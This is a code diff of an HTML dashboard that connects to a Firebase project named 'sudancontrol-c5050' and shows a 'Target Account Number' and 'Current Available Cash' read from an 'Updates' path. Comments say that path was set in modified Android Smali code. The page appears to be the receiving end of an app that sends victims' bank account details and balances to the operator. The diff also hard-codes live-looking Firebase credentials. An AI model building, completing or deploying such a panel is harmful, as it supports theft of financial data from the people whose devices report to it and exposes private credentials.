@@ -3,78 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel</title>
+    <title>System Control Panel</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; text-align: center; }
-        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .card { border: 1px solid #ddd; padding: 15px; margin: 10px; border-radius: 8px; display: inline-block; width: 40%; }
-        .value { font-size: 24px; font-weight: bold; color: #2c3e50; }
-        .label { color: #7f8c8d; margin-bottom: 5px; }
-        #loading { font-style: italic; color: #e67e22; }
-        .status-online { color: #27ae60; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0e1217; color: #ffffff; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 900px; background: #1c1f26; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #30363d; }
+        h2 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+        .loading { color: #f0883e; font-style: italic; margin: 20px 0; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }
+        .card { background: #0d1117; padding: 20px; border-radius: 10px; border: 1px solid #30363d; text-align: left; }
+        .label { color: #8b949e; font-size: 14px; text-transform: uppercase; margin-bottom: 10px; }
+        .value { font-size: 26px; font-weight: bold; color: #aff5b4; font-family: monospace; }
+        .status-bar { margin-top: 30px; font-size: 14px; color: #8b949e; }
+        .online { color: #3fb950; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>System Dashboard</h2>
-    <div id="loading">Waiting for device data...</div>
+    <h2>Device Logs Monitor</h2>
+    <div id="loading" class="loading">Searching for active connections...</div>
     
     <div id="data-section" style="display: none;">
-        <div class="card">
-            <div class="label">Target Account</div>
-            <div id="acc_val" class="value">0000000</div>
+        <div class="grid">
+            <div class="card">
+                <div class="label">Target Account Number</div>
+                <div id="acc_val" class="value">--------</div>
+            </div>
+            <div class="card">
+                <div class="label">Current Available Cash</div>
+                <div id="cash_val" class="value">0.00</div>
+            </div>
         </div>
-        <div class="card">
-            <div class="label">Current Balance</div>
-            <div id="cash_val" class="value">0.00</div>
-        </div>
-        <div style="margin-top: 20px;">
-            Status: <span class="status-online">Connected</span>
+        <div class="status-bar">
+            Server Status: <span class="online">Live & Connected</span> | Project ID: sudancontrol-c5050
         </div>
     </div>
 </div>
 
 <script>
-    // Paste your Firebase Config here
+    // Integrated Data from your google-services.json
     const firebaseConfig = {
-        apiKey: "YOUR_API_KEY",
-        authDomain: "YOUR_PROJECT.firebaseapp.com",
-        databaseURL: "YOUR_DATABASE_URL",
-        projectId: "YOUR_PROJECT_ID",
-        storageBucket: "YOUR_PROJECT.appspot.com",
-        messagingSenderId: "YOUR_ID",
-        appId: "YOUR_APP_ID"
+        apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
+        authDomain: "sudancontrol-c5050.firebaseapp.com",
+        databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
+        projectId: "sudancontrol-c5050",
+        storageBucket: "sudancontrol-c5050.firebasestorage.app",
+        messagingSenderId: "111262781250",
+        appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
     };
 
+    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Matching your App's paths: "Account" and "Cash"
+    // Reference to the path "Updates" as defined in your Smali code
     const dataRef = db.ref('Updates'); 
 
     dataRef.on('value', (snapshot) => {
-        const loadingTrigger = document.getElementById('loading');
-        const dataSection = document.getElementById('data-section');
+        const loadingDiv = document.getElementById('loading');
+        const dataDiv = document.getElementById('data-section');
         
         if (snapshot.exists()) {
-            loadingTrigger.style.display = 'none';
-            dataSection.style.display = 'block';
+            loadingDiv.style.display = 'none';
+            dataDiv.style.display = 'block';
             
             snapshot.forEach((childSnapshot) => {
-                const val = childSnapshot.val();
+                const data = childSnapshot.val();
                 
-                // Directly reading the keys from your Smali code
-                if(val.Account) {
-                    document.getElementById('acc_val').innerText = val.Account;
+                // Map Firebase keys "Account" and "Cash" to UI
+                if(data.Account) {
+                    document.getElementById('acc_val').innerText = data.Account;
                 }
-                if(val.Cash) {
-                    document.getElementById('cash_val').innerText = val.Cash;
+                if(data.Cash) {
+                    document.getElementById('cash_val').innerText = data.Cash;
                 }
             });
+        } else {
+            loadingDiv.innerText = "Connected to Firebase, but no data found in 'Updates' path.";
         }
+    }, (error) => {
+        document.getElementById('loading').innerText = "Error: " + error.message;
     });
 </script>
 
